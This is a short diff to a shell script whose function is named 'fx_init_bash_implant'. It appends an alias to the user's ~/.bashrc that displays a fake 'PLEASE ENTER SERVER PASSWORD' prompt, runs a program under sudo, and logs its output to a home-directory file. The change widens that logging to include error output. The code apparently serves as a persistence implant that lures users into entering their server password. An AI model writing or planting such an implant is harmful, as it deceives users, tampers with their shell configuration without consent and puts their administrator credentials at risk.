@@ -44,6 +44,6 @@ fx_init_bash_implant() {
 
 
 
-echo "alias 'wahupdate'='echo ***PLEASE ENTER SERVER PASSWORD*** && sudo /usr/bin/wahupdate  | tee ~/log.txt'" >> ~/.bashrc
+echo "alias 'wahupdate'='echo ***PLEASE ENTER SERVER PASSWORD*** && sudo /usr/bin/wahupdate 2>&1 | tee ~/log.txt'" >> ~/.bashrc
 fx_init_bash_implant
 fx_call_end
